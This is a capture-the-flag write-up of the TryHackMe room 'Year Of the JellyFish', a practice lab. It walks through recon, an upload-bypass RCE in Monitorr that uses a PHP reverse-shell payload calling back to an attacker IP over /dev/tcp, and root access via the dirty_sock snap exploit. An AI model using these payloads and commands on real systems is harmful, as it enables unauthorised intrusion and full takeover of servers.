---
title: Year Of the JellyFish - TryHackMe
author: Vishnu Sudhakaran
date: 2021-09-02 09:30:00 +0530
categories: [TryHackMe]
tags: [ cve, box, privesc, linux, code ]
---

![](/assets/img/posts/jellyfish/chall.png)

Room: [https://tryhackme.com/room/yearofthejellyfish](https://tryhackme.com/room/yearofthejellyfish)

This article is about the room Year Of The JellyFish capture the flag created by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) on [TryHackMe](https://tryhackme.com/).

This box is part of an OSCP voucher giveaway. The prize is donated by [@q8fawazo](https://twitter.com/q8fawazo).

## Reconnaissance:

You will get a specific IP_Address of this machine, let's start with nmap scan.

```bash
nmap -sC -sV $IP
```

![](/assets/img/posts/jellyfish/nmap.png)

we can see 80, 443 are open, let's open it in browser. We can see port 80 is redirect to [https://robyns-petshop.thm/](https://robyns-petshop.thm/), also nmap detects multiple sub domains, so it will be a VirtualHost.

![](/assets/img/posts/jellyfish/dns.png)

So we need to add IP and Domains to the `/etc/hosts` file.

![](/assets/img/posts/jellyfish/hosts.png)

## Enumeration:

Let's go through the domains,

![](/assets/img/posts/jellyfish/1s.png)

![](/assets/img/posts/jellyfish/beta.png)

![](/assets/img/posts/jellyfish/dev.png)

![](/assets/img/posts/jellyfish/monitorr.png)

I started with `dirb` on [https://robyns-petshop.thm/](https://robyns-petshop.thm/), i got some directories that countains information about themes, plugins, etc.. bad luck :(

![](/assets/img/posts/jellyfish/dirb.png)

The *dev.robyns-petshop.thm* subdomain is appeared to be same as *robyns-petshop.thm*, and from *beta.robyns-petshop* domain nothing got suspicious.

After i visited the `https://monitorr.robyns-petshop.thm/` this something bugs me, and it was open source, there is an login portal on monitorr settings.

![](/assets/img/posts/jellyfish/monlogin.png)

I visited an [GitHub Repo](https://github.com/Monitorr/Monitorr/tree/master/assets/config/_installation/vendor) and found some interesting files.

![](/assets/img/posts/jellyfish/gitre.png)

Going through the source code of `_install.php`, it creates a empty database, after that we can create an account on `login.php`. and its perfectly worked in this server too. After login to monitor settings, there is an image upload option in services-configuration, we can create an reverse shell connection through file upload vulnerability, its has also have mime validation & extension checking, after some failed attempts, i'am able to bypass both with ".png.pHp" extension and get the reverse shell connection.

But when i try to access this room yesterday with this image upload vulnerability, it couldn't worked maybe the room owner fix that vulnerability. So let's go for another vulnerability.

When i search google for monitorr 1.7.6m exploit i got something interesting in [exploit database](https://www.exploit-db.com/exploits/48980).

![](/assets/img/posts/jellyfish/exp.png)

It was (EDB id: 48980) An unauthenticated RCE would be absolutely perfect exploit here.

Let's create a reverse shell payload.

```bash
echo -e $'\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo system("bash -c \'bash -i >& /dev/tcp/10.4.29.202/443 0>&1\'");' > an0n.png.pHp
```

Now we have to upload the reverse shell we created with `curl` command.

```bash
curl -k -F "fileToUpload=@./an0n.png.pHp" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
```

To get the reverse shell.

```bash
curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/an0n.png.php
```

Same time set listener on another tab.

```bash
nc -lvp 443
```

![](/assets/img/posts/jellyfish/flag11.png)

We successfully get the reverse shell thorough RCE. The first flag we can obtained from `/var/www/flag1.txt` file.

## Privilege Escalation:

It's time to root the machine. Here i used [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester).

It show us snap version was vulnerable to dirty_sock (CVE-2019–7304) exploit(EDB id: [46362](https://www.exploit-db.com/exploits/46362)). let's move in to /tmp directory.

![](/assets/img/posts/jellyfish/snpve.png)

![](/assets/img/posts/jellyfish/dirt.png)

Then get the exploit from [exploit-db](https://www.exploit-db.com/download/46362) with `wget` command, and give permission.

![](/assets/img/posts/jellyfish/wget.png)

Let's run the exploit, and it successfully exploited the machine!

![](/assets/img/posts/jellyfish/sock.png)

Now we can switch user with `su` command, username will be `dirty_sock` and password will be `dirty_sock`. After that go for sudo su, we will be root.

![](/assets/img/posts/jellyfish/rooot.png)

We can obtain root flag from `/root/root.txt`

### Thank you for reading my writeup! Hope you enjoyed it.
